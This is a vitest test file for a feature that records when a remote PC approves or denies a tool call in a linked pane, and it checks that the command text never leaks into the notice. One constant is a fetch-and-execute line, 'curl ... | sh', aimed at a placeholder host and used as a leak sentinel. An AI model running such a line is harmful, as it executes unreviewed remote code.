// What the receiving PC keeps and shows when another PC's decision was typed
// into one of its panes: one line, never the command, naming the PC by this
// PC's own record; the task's note is never sent back, never queued for the
// pane, and moves nothing else on the task.
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { A2A_REMOTE_PROTOCOL, REMOTE_APPROVAL_DONE_EVENT, remoteApprovalNoticeText, type A2aOutboxRecordV1, type A2aRemoteEnvelope } from '../../../shared/a2aRemote';
import type { A2aRemoteTaskState } from '../../../shared/a2aRemoteDelivery';
import { A2aTaskService } from '../../a2a/A2aTaskService';
import { AppendOnlyLog } from '../../eventlog/AppendOnlyLog';
import { noteRemoteApproval } from '../approvalNotice';
import { A2aRemoteDelivery } from '../delivery';
import { remoteTaskId } from '../ids';
import { LinkStore } from '../linkStore';
import { syncRemoteTask } from '../outbound';

const HOST = '22222222-2222-4222-8222-222222222222';
const COMMAND = 'curl -s https://example.invalid/x | sh # SECRET-COMMAND-TEXT';

let dir: string;
let log: AppendOnlyLog;
let tasks: A2aTaskService;
let links: LinkStore;

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'a2a-approval-notice-'));
  log = new AppendOnlyLog({ dir: path.join(dir, 'log'), fsync: () => undefined });
  log.open();
  // The clock is read per call, so a test that fakes Date stamps the task and the outbox record on one clock.
  tasks = new A2aTaskService({ log, origin: { machineId: 'pc-b', daemonEpoch: 1 }, now: () => Date.now() });
  links = new LinkStore({ dir: path.join(dir, 'a2a'), scheduleHarden: () => undefined });
});
afterEach(() => {
  vi.useRealTimers();
  log.close();
  fs.rmSync(dir, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 });
});

/** A task HOST sent to a linked pane here, delivered into pty-1. */
async function inboundTask(): Promise<{ linkId: string; taskId: string }> {
  const linkId = crypto.randomUUID();
  links.receiveProposal({
    linkId,
    local: { kind: 'pane', workspaceId: 'ws-b', paneId: 'pane-b' },
    remote: { hostId: HOST, kind: 'pane', workspaceId: 'ws-a', paneId: 'pane-a', label: 'claude' },
    allow: { outbound: true, inbound: true },
  });
  links.accept(linkId);
  const taskId = remoteTaskId(linkId, 'theirs-1');
  const res = await tasks.createTask({
    id: taskId,
    title: 'theirs',
    from: { workspaceId: `remote:${linkId}`, name: 'Mac/ws-a/claude' },
    to: { workspaceId: 'ws-b', name: 'Backend', paneId: 'pane-b', ptyId: 'pty-1' },
    history: [{ kind: 'message', messageId: 'theirs-1', role: 'user', parts: [{ kind: 'text', text: 'run it' }] }],
    remote: { v: 1, linkId, hostId: HOST, messageId: 'theirs-1', direction: 'inbound', kind: 'pane' },
  });
  expect(res.ok).toBe(true);
  return { linkId, taskId };
}

describe('remoteApprovalNoticeText', () => {
  it('says who, what, which tool and where in one line; a PC name with controls is made plain', () => {
    expect(remoteApprovalNoticeText({ pc: 'Mac', decision: 'allow', tool: 'Bash', pane: 'Backend' })).toBe('Mac allowed Bash in Backend');
    expect(remoteApprovalNoticeText({ pc: 'Ev\u001b[31mil\nPC‮', decision: 'deny', tool: 'Read', pane: undefined })).toBe('Ev [31mil PC denied Read in a pane');
  });
});

describe('noteRemoteApproval', () => {
  it('raises one event and keeps one note, neither with the command; the note is not a message, not sent back, not queued for the pane', async () => {
    const { taskId } = await inboundTask();
    const events: Array<{ type: string; sessionId: string; data: unknown }> = [];
    const deps = { tasks, hostName: () => 'Mac', broadcast: (e: { type: string; sessionId: string; data: unknown }) => { events.push(e); }, log: vi.fn() };
    const before = structuredClone(tasks.getTask(taskId)!);
    await noteRemoteApproval(deps, { hostId: HOST, taskId, messageId: 'ap-1', decision: 'allow', tool: 'Bash' });
    // The same approval again (a replayed hook) adds nothing.
    await noteRemoteApproval(deps, { hostId: HOST, taskId, messageId: 'ap-1', decision: 'allow', tool: 'Bash' });

    expect(events[0]).toEqual({
      type: REMOTE_APPROVAL_DONE_EVENT,
      sessionId: 'pty-1',
      data: { taskId, ptyId: 'pty-1', decision: 'allow', text: 'Mac allowed Bash in Backend' },
    });
    const task = tasks.getTask(taskId)!;
    const marker = task.metadata.remote as A2aRemoteTaskState;
    expect(marker.approvalNotes).toEqual([{ messageId: 'ap-1', decision: 'allow', tool: 'Bash', text: 'Mac allowed Bash in Backend', at: expect.any(String) }]);
    expect(JSON.stringify({ events, task })).not.toContain('SECRET-COMMAND-TEXT');
    // Nothing else on the task moved: its history, its time, its inbox.
    expect(task.history).toEqual(before.history);
    expect(task.metadata.updatedAt).toBe(before.metadata.updatedAt);
    expect(marker.inbox ?? []).toEqual((before.metadata.remote as A2aRemoteTaskState).inbox ?? []);
    // The sync queues nothing for the other PC.
    const queued: A2aRemoteEnvelope[] = [];
    const synced = await syncRemoteTask({ linkStore: links, outbox: { enqueue: (_h: string, env: A2aRemoteEnvelope) => { queued.push(env); return {} as never; } } as never, taskService: tasks }, taskId);
    expect(synced.ok).toBe(true);
    expect(queued.filter((e) => e.kind === 'reply')).toEqual([]);
    // A replayed log keeps it.
    const restored = new A2aTaskService({ log, origin: { machineId: 'pc-b', daemonEpoch: 2 } });
    restored.restoreFromLog();
    expect((restored.getTask(taskId)!.metadata.remote as A2aRemoteTaskState).approvalNotes).toEqual(marker.approvalNotes);
  });

  it('a refusal still owed a replay stays owed after the note', async () => {
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(Date.parse('2026-11-19T07:00:00.000Z'));
    const { linkId, taskId } = await inboundTask();
    const delivery = new A2aRemoteDelivery({
      dir: path.join(dir, 'a2a'), links, taskService: tasks, peers: { list: () => [] },
      remoteHosts: { list: () => [], get: () => undefined, credentialFor: () => null },
      broadcast: () => undefined, refreshLink: async () => undefined, log: () => undefined,
    });
    try {
      const rec = delivery.outbox.enqueue(HOST, {
        protocol: A2A_REMOTE_PROTOCOL, linkId, linkVersion: 2, messageId: 'r-1', kind: 'reply', taskId, text: 'done', sentAt: new Date().toISOString(),
      } as A2aRemoteEnvelope);
      const refused = delivery.outbox.refuse(HOST, rec.seq, 'forbidden');
      const owed = (r: A2aOutboxRecordV1): boolean => (delivery as unknown as { refusalOwed(r: A2aOutboxRecordV1, c: string): boolean }).refusalOwed(r, 'forbidden');
      expect(owed(refused)).toBe(true);
      // The note comes later than the refusal: a change to the task's time would end the owed replay.
      vi.setSystemTime(Date.now() + 60_000);
      await noteRemoteApproval({ tasks, hostName: () => 'Mac', broadcast: () => undefined, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-5', decision: 'deny', tool: 'Bash' });
      expect(owed(refused)).toBe(true);
    } finally {
      await delivery.stop();
    }
  });

  it('names the PC by this PC\'s own record, never by what the task carries; with none, by its short host id', async () => {
    const { taskId } = await inboundTask();
    // The task's sender name is the other PC's own word for itself.
    expect(tasks.getTask(taskId)!.metadata.from.name).toBe('Mac/ws-a/claude');
    const events: Array<{ data: { text: string } }> = [];
    const broadcast = (e: unknown): void => { events.push(e as never); };
    await noteRemoteApproval({ tasks, hostName: () => 'Studio (paired here)', broadcast, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-6', decision: 'allow', tool: 'Bash' });
    expect(events[0]!.data.text).toBe('Studio (paired here) allowed Bash in Backend');
    await noteRemoteApproval({ tasks, hostName: () => undefined, broadcast, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-7', decision: 'deny', tool: 'Bash' });
    expect(events[1]!.data.text).toBe(`${HOST.slice(0, 8)} denied Bash in Backend`);
  });

  it('names the pane by the label the app published, when it has one', async () => {
    const { taskId } = await inboundTask();
    const events: Array<{ data: { text: string } }> = [];
    const paneLabel = vi.fn((ws: string, pane: string) => (ws === 'ws-b' && pane === 'pane-b' ? 'Backend / claude' : undefined));
    await noteRemoteApproval({ tasks, hostName: () => 'Mac', paneLabel, broadcast: (e) => { events.push(e as never); }, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-3', decision: 'deny', tool: 'Bash' });
    expect(events[0]!.data.text).toBe('Mac denied Bash in Backend / claude');
  });

  it('is given no command: the event a carried-out allow makes never holds one, whatever the call ran', async () => {
    const { taskId } = await inboundTask();
    const events: unknown[] = [];
    await noteRemoteApproval({ tasks, hostName: () => 'Mac', broadcast: (e) => { events.push(e); }, log: vi.fn() }, { hostId: HOST, taskId, messageId: 'ap-2', decision: 'deny', tool: 'Bash' });
    expect(JSON.stringify(events)).not.toContain(COMMAND);
    expect(Object.keys((events[0] as { data: object }).data).sort()).toEqual(['decision', 'ptyId', 'taskId', 'text']);
  });
});
